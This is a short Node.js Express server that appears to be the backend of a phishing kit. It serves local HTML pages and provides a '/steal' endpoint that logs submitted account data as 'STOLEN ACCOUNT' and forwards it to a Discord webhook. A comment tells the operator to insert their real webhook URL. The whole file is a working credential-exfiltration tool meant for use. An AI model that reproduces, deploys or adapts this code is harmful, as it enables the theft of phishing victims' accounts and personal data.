const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(__dirname));           // Serve all HTML files
app.use(express.json());

app.post('/steal', (req, res) => {
  const data = req.body;
  console.log('=== STOLEN ACCOUNT ===', data);
  
  // Replace with your real Discord webhook
  fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      content: `**NEW STEAL**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` 
    })
  }).catch(() => {});

  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on port ${PORT}`));
